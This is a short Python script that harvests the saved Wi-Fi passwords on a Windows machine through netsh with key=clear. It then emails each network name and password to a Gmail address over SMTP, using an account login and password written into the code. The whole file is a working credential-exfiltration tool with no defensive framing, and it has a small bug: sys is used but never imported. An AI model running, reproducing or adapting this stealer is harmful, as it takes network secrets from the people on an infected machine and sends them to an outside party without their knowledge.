import subprocess
import re
import json
import smtplib

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login('mihadac681@gmail.com', 'xssdkdizoqktjfba')



def crackwifi(filename=None):
	try:
		wifi_psk = dict()
		command = subprocess.run('netsh wlan show profiles', capture_output=True, shell=True).stdout.decode()
		capture_wifi_name = re.findall(r'All User Profile     : (.*?)\r\n', command)
		for wifi in capture_wifi_name:
			key_command = subprocess.run(f'netsh wlan show profile name={wifi} key=clear', capture_output=True, shell=True).stdout.decode()
			psk = re.findall(r'Key Content            : (.*?)\r\n', key_command)
			if psk != []:
				wifi_psk[wifi] = psk[-1]
		if filename != None:
			with open(filename, 'w') as thefile:
				thefile.write(json.dumps(wifi_psk))
		return wifi_psk
				
	except Exception as error:
		sys.exit(1)

def mail_sender(content):
	if content != None:
		server.sendmail('mihadac681@gmail.com', 'mihadac681@gmail.com', str(content))
	else:
		sys.exit(1)

def main():
	try:
		wifipsk = crackwifi()
		for x in wifipsk:
			psk = wifipsk.get(x)
			content = f'{x} | {psk}'
			mail_sender(content)
	except Exception as error:
		sys.exit(1)



if __name__ == '__main__':
	main()